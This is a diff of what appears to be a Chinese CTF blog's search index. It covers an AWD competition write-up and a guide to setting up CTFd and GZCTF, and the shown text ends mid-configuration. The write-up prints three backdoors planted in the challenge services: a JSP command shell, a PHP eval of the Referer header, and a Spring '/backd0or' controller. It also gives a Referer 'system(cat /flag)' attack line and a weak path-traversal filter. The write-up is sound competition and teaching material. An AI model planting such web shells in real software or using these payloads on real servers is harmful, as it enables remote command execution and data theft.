@@ -144,8 +144,8 @@
 <p>脚本批量改密码后批量获取flag</p>
 <p><img src="/img/awd/ccb-tomcat-2.png"></p>
 <p><strong>修复：</strong></p>
-<p>修改后台密码</p>
-<h2 id="漏洞2"><a href="#漏洞2" class="headerlink" title="漏洞2"></a>漏洞2</h2><p><code>\tomcat\apache-tomcat-8.5.99\webapps\ROOT\forget.jsp</code>存在后门</p>
+<p>修改后台密码&#x2F;修改上传代码&#x2F;增加waf</p>
+<h2 id="漏洞2"><a href="#漏洞2" class="headerlink" title="漏洞2"></a>漏洞2</h2><p><code>\webapps\ROOT\forget.jsp</code>存在后门</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmdParameter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd1&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cmdParameter != <span class="hljs-literal">null</span> &amp;&amp; !cmdParameter.isEmpty()) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 构建系统命令</span><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>();<br>            processBuilder.command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmdParameter);<br><br>            <span class="hljs-comment">// 执行命令并获取输出</span><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> processBuilder.start();<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>            String line;<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                output.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-comment">// 输出命令执行结果</span><br>            out.println(<span class="hljs-string">&quot;Command executed successfully. Output:\n&quot;</span> + output.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            out.println(<span class="hljs-string">&quot;Error executing command: &quot;</span> + e.getMessage());<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
 
 
@@ -153,7 +153,7 @@
 <p>开局很快都修复了，手动交了两三个</p>
 <p><strong>修复：</strong></p>
 <p>把密码改了</p>
-<h1 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h1><h2 id="漏洞1-1"><a href="#漏洞1-1" class="headerlink" title="漏洞1"></a>漏洞1</h2><p><code>\cms\funadmin\app\frontend\controller\Ajax.php</code> 存在任意文件读取</p>
+<h1 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h1><h2 id="漏洞1-1"><a href="#漏洞1-1" class="headerlink" title="漏洞1"></a>漏洞1</h2><p><code>\app\frontend\controller\Ajax.php</code> 存在任意文件读取</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">root_path</span>().<span class="hljs-string">&#x27;public/storage/uploads/&#x27;</span>.<span class="hljs-variable">$file</span>;<br>    <span class="hljs-comment">// 检查文件是否存在</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-variable">$result</span> = [<span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;file not exists!&#x27;</span>)];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 获取文件名</span><br>    <span class="hljs-variable">$fileName</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-comment">// 设置HTTP响应头</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="hljs-variable">$fileName</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br><br>    <span class="hljs-comment">// 读取文件并输出给用户</span><br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-comment">// 终止脚本继续执行</span><br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 
@@ -164,16 +164,19 @@
 <p><img src="/img/awd/ccb-cms-1.png"></p>
 <p><strong>修复：</strong></p>
 <p>增加过滤</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">root_path</span>().<span class="hljs-string">&#x27;public/storage/uploads/&#x27;</span>.<span class="hljs-variable">$file</span>;<br>        <span class="hljs-comment">// 检查文件是否存在</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;../&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$result</span> = [<span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;file not exists!&#x27;</span>)];<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// 获取文件名</span><br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// 设置HTTP响应头</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="hljs-variable">$fileName</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br><br>        <span class="hljs-comment">// 读取文件并输出给用户</span><br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// 终止脚本继续执行</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">root_path</span>().<span class="hljs-string">&#x27;public/storage/uploads/&#x27;</span>.<span class="hljs-variable">$file</span>;<br>        <span class="hljs-comment">// 检查文件是否存在</span><br><br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;../&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$result</span> = [<span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;file not exists!&#x27;</span>)];<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// 获取文件名</span><br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// 设置HTTP响应头</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="hljs-variable">$fileName</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br><br>        <span class="hljs-comment">// 读取文件并输出给用户</span><br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// 终止脚本继续执行</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
 
-<h2 id="漏洞2-1"><a href="#漏洞2-1" class="headerlink" title="漏洞2"></a>漏洞2</h2><p><code>\cms\funadmin\app\api\controller\v1\Token.php</code>存在任意命令执行</p>
+<h2 id="漏洞2-1"><a href="#漏洞2-1" class="headerlink" title="漏洞2"></a>漏洞2</h2><p><code>\app\api\controller\v1\Token.php</code>存在任意命令执行</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">api</span>\<span class="hljs-title class_">controller</span>\<span class="hljs-title class_">v1</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">fun</span>\<span class="hljs-title">auth</span>\<span class="hljs-title">Api</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">App</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Config</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 生成token</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Token</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Api</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$noAuth</span> = [<span class="hljs-string">&#x27;*&#x27;</span>];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">App <span class="hljs-variable">$app</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-variable">$app</span>);<br>        <span class="hljs-comment">//跨域</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Headers:Accept,Referer,Host,Keep-Alive,User-Agent,X-Requested-With,Cache-Control,Content-Type,Cookie,token&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Credentials:true&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Methods:GET, POST, PATCH, PUT, DELETE,OPTIONS&#x27;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">build</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">refresh</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">refresh</span>();<br><br>    &#125;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()[<span class="hljs-string">&#x27;Referer&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p><strong>攻击：</strong></p>
 <p><code>/api/v1.token/test</code><br><code>Referer:system(&quot;cat /flag&quot;);</code></p>
 <p><strong>修复：</strong></p>
 <p>注释<code>//@eval(getallheaders()[&#39;Referer&#39;]);</code></p>
-<h2 id="漏洞3"><a href="#漏洞3" class="headerlink" title="漏洞3"></a>漏洞3</h2><p>貌似还有个任意文件上传，没时间看了</p>
+<h2 id="漏洞3"><a href="#漏洞3" class="headerlink" title="漏洞3"></a>漏洞3</h2><p>貌似还有个任意文件上传，比赛的时候没时间看了</p>
+<hr>
+<p>赛后复现</p>
+<p>前台 .phtml 文件绕过上传rce<br>POST &#x2F;frontend&#x2F;ajax&#x2F;uploads</p>
 <h1 id="DocToolkit"><a href="#DocToolkit" class="headerlink" title="DocToolkit"></a>DocToolkit</h1><h2 id="漏洞1-2"><a href="#漏洞1-2" class="headerlink" title="漏洞1"></a>漏洞1</h2><p>存在默认后门</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.doctoolkit.controller.test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/test&quot;&#125;)</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-comment">/* loaded from: DocToolkit-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/doctoolkit/controller/test/TestController.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/backd0or&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">backdoor</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;cmd&quot;)</span> String command)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (command != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osType</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osType != <span class="hljs-literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="hljs-string">&quot;windows&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, command&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmds).start();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len);<br>            <span class="hljs-keyword">return</span> output;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -1807,8 +1810,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>2023</tag>
         <tag>宁波</tag>
+        <tag>2023</tag>
       </tags>
   </entry>
   <entry>
@@ -2267,15 +2270,15 @@
 <p><img src="https://github.com/dr0n1/auto_deploy/blob/main/auto_deploy.gif?raw=true"></p>
 <h1 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h1><p>V1.0: 第一代脚本<br>V1.1: 增加 python 安装模块<br>V1.2: 优化安装逻辑等<br>V1.3：移除 python，新增 golang 和 java<br>V2.1：增加 CTF-Misc 部分工具的安装<br>V2.2：优化可重复运行脚本逻辑<br>V2.3：优化部分 python 模块安装逻辑<br>V2.4：增加部分misc工具，格式化代码<br>V3.1：移除了centos的工具支持，增加golang多版本支持等</p>
 <h1 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h1><p>1：计划增加 web 系列工具</p>
-<p>有疑问或者有更好的建议请联系<a href="mailto:&#49;&#x39;&#51;&#x30;&#55;&#55;&#x34;&#x33;&#x37;&#52;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#x6d;">&#49;&#x39;&#51;&#x30;&#55;&#55;&#x34;&#x33;&#x37;&#52;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
+<p>有疑问或者有更好的建议请联系<a href="mailto:&#x31;&#x39;&#51;&#48;&#x37;&#55;&#52;&#51;&#x37;&#x34;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#x31;&#x39;&#51;&#48;&#x37;&#55;&#52;&#51;&#x37;&#x34;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a></p>
 ]]></content>
       <categories>
         <category>项目</category>
       </categories>
       <tags>
         <tag>misc</tag>
-        <tag>脚本</tag>
         <tag>自动化</tag>
+        <tag>脚本</tag>
       </tags>
   </entry>
   <entry>
@@ -4360,8 +4363,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>misc</tag>
+        <tag>总结</tag>
         <tag>内存取证</tag>
         <tag>流量分析</tag>
       </tags>
@@ -4579,8 +4582,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>misc</tag>
+        <tag>总结</tag>
         <tag>隐写术</tag>
       </tags>
   </entry>
@@ -5162,8 +5165,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>misc</tag>
+        <tag>总结</tag>
         <tag>隐写</tag>
         <tag>压缩文件</tag>
       </tags>
@@ -5361,8 +5364,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>misc</tag>
+        <tag>总结</tag>
         <tag>编码</tag>
         <tag>密码</tag>
       </tags>
@@ -5790,31 +5793,27 @@
   <entry>
     <title>ctf平台搭建与出题指南</title>
     <url>/posts/5ae46a89/</url>
-    <content><![CDATA[<h1 id="ctf平台搭建"><a href="#ctf平台搭建" class="headerlink" title="ctf平台搭建"></a>ctf平台搭建</h1><p>平台选择的是目前使用最广泛的<a href="https://github.com/CTFd/CTFd">CTFd</a>，二开也很方便，相关插件也很多</p>
-<p>以下两种安装方法都使用了<code>glzjin</code>的<a href="https://github.com/glzjin/CTFd-Whale">CTFd-Whale</a>插件，以支持动态靶机</p>
-<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>使用帆哥的<a href="https://github.com/pwnthebox/ctfd-auto-deploy">一键部署脚本</a>（centos7和ubuntu20上测试成功）<br><code>sh &lt;(curl -s https://raw.githubusercontent.com/pwnthebox/ctfd-auto-deploy/master/install.sh)</code></p>
-<p>注意点：中间需要手动输入三个值<br>分别是<br><code>Http Domain Suffix</code> ：<code>域名/ip</code><br><code>External Http Port</code> : <code>靶机http映射端口</code> (这里不能写80，因为80给了nginx，当然也可以自己改下脚本，不使用nginx代理)<br><code>Direct Minimum/Maximum Port</code> : <code>靶机端口开放范围</code></p>
-<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-1.png"></p>
-<blockquote>
-<p>注：用这个脚本的时候最好挂代理，不然可能跑一天。如果脚本成功运行完毕，那么平台上就无需再次配置，很方便</p>
+    <content><![CDATA[<h1 id="ctf平台搭建"><a href="#ctf平台搭建" class="headerlink" title="ctf平台搭建"></a>ctf平台搭建</h1><p>目前最常见的平台是CTFd和GZCTF</p>
+<h2 id="CTFd"><a href="#CTFd" class="headerlink" title="CTFd"></a>CTFd</h2><p><del>使用帆哥的<a href="https://github.com/pwnthebox/ctfd-auto-deploy">一键部署脚本</a>（centos7和ubuntu20上测试成功）</del><br><del><code>sh &lt;(curl -s https://raw.githubusercontent.com/pwnthebox/ctfd-auto-deploy/master/install.sh)</code></del></p>
+<hr>
+<p>2024.5.13<br>帆哥github被封了，重构&#x2F;优化了一下自动部署脚本</p>
+<p><a href="https://github.com/dr0n1/CTFd_auto_deploy">https://github.com/dr0n1/CTFd_auto_deploy</a></p>
+<h2 id="GZCTF"><a href="#GZCTF" class="headerlink" title="GZCTF"></a>GZCTF</h2><blockquote>
+<p>适合办比赛（样式也好看），不适合自用和训练</p>
 </blockquote>
-<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>使用鲸喵师傅打包好的ctfd和whale插件<br>先准备好<code>docker</code>环境和<code>docker-compose</code></p>
-<p>创建swarm集群<br><code>docker swarm init</code></p>
-<p>加入集群<br><code>docker node update --label-add=&#39;name=linux-1&#39; $(docker node ls -q)</code></p>
-<p>拉取镜像<br><code>git clone https://github.com/VaalaCat/CTFd.git --depth=1</code><br><code>git clone https://github.com/VaalaCat/ctfd-whale.git</code></p>
-<p>修改token<br>两个文件的token值修改成一样的，如果用到了域名记得修改<code>subdomain_host</code><br><code>vim CTFd/conf/frp/frps.ini</code><br><code>vim CTFd/conf/frp/frpc.ini</code></p>
-<p>安装插件（在CTFd目录下运行）<br><code>git submodule update --init</code></p>
-<p>启动（在CTFd目录下运行）<br><code>docker-compose up -d</code></p>
-<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-2.png"></p>
-<p>访问<a href="http://xx.xx.xx.xx:9124/">http://xx.xx.xx.xx:9124</a> (默认是9124，想要80可以修改docker-compose.yml)</p>
-<p><strong>平台配置</strong><br>右上角的插件中进入 Whale 设置，其中，左侧 Docker&#x2F;Limits&#x2F;Challenges 菜单栏根据需求自行更改， Frp 菜单栏中的内容需要更改一下几个选项</p>
-<p><code>Http Domain Suffix</code>	node.lewiserii.top 这里填写使用http方式访问靶机的泛解析域名<br><code>Http Port</code>	8080 这里填写frps中的vhost_http_port，该端口为http方式靶机访问的端口<br><code>Direct IP Address</code>	xxx.xxx.xxx.xxx 这里填写服务器ip，用于显示Direct方式访问的题目的IP<br><code>Direct Minimum Port</code>	9000 这里填写用于动态靶机Direct方式的开始端口<br><code>Direct Maximum Port</code>	9200 这里填写结束端口</p>
-<p>优点：非常稳定，基本都能一次成功</p>
-<h1 id="动态flag题目部署"><a href="#动态flag题目部署" class="headerlink" title="动态flag题目部署"></a>动态flag题目部署</h1><p>模板项目地址：<a href="https://github.com/dr0n1/CTFd_Docker_Template">https://github.com/dr0n1/CTFd_Docker_Template</a></p>
+<p>新建两个文件 appsettings.json 和 docker-compose.yml</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;AllowedHosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;ConnectionStrings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Database&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=&lt;String1&gt;&quot;</span><br>      <span class="hljs-comment">//&lt;String1&gt;换成数据库密码，随机密码且长度足够</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;Logging&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;LogLevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Default&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Information&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Microsoft&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Warning&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Microsoft.Hosting.Lifetime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Information&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">//邮箱配置</span><br>  <span class="hljs-attr">&quot;EmailConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;SendMailAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin@xxx.com&quot;</span><span class="hljs-punctuation">,</span>		<span class="hljs-comment">// 填入邮箱</span><br>    <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ctf_noreply&quot;</span><span class="hljs-punctuation">,</span>				    <span class="hljs-comment">// 发件人名称</span><br>    <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;******&quot;</span><span class="hljs-punctuation">,</span>                 <span class="hljs-comment">// 邮箱密码，部分服务商需要填入授权码</span><br>    <span class="hljs-attr">&quot;Smtp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;smtp.163.com&quot;</span><span class="hljs-punctuation">,</span>				  <span class="hljs-comment">// 此处为163邮箱服务器，具体自定</span><br>      <span class="hljs-attr">&quot;Port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">465</span><br>   